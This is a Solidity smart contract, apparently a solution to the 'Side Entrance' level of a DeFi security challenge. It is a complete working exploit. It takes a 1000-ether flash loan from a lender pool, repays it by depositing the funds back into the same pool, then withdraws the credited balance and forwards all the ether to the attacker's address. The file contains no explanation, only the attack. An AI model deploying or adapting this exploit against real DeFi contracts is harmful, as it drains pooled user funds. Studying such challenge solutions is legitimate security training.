// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ILenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    using Address for address payable;

    ILenderPool private immutable s_lenderPool;
    address private immutable s_owner;

    constructor(address _lenderPool) {
        s_lenderPool = ILenderPool(_lenderPool);
        s_owner = msg.sender;
    }

    function execute() external payable {
        s_lenderPool.deposit{value: msg.value}();
    }

    function attack() external {
        s_lenderPool.flashLoan(1000 ether);
        s_lenderPool.withdraw();

        payable(s_owner).sendValue(address(this).balance);
    }

    // Allow deposits of ETH
    receive() external payable {}
}
